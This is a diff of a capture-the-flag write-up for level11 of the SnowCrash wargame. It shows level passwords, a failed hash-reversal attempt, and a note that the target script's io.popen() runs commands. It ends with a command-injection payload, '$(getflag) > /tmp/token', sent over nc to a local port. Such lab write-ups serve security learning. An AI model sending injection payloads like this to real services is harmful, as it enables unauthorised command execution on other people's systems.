@@ -1,5 +1,5 @@
 su level11
-pass : woupa2yuojeeaaed06riuj63c
+pass : feulo4b72j7edeahuete3no7c
 
 -r-x------  1 level11 level11  220 Apr  3  2012 .bash_logout
 -r-x------  1 level11 level11 3518 Aug 30  2015 .bashrc
@@ -19,8 +19,9 @@ we tried to reverse the pass word in code with https://sha1.gromweb.com/
 => NotSoEasy
 => doesn't work
 
-when we execute the file, we have flag11 rights, 
+when we execute the file, we have flag11 rights, an the function io.popen() execute command
 so we use execution to directly launch the getflag and copy the output to a file
+
 
 level11@SnowCrash:~$ nc localhost 5151
 Password: $(getflag) > /tmp/token
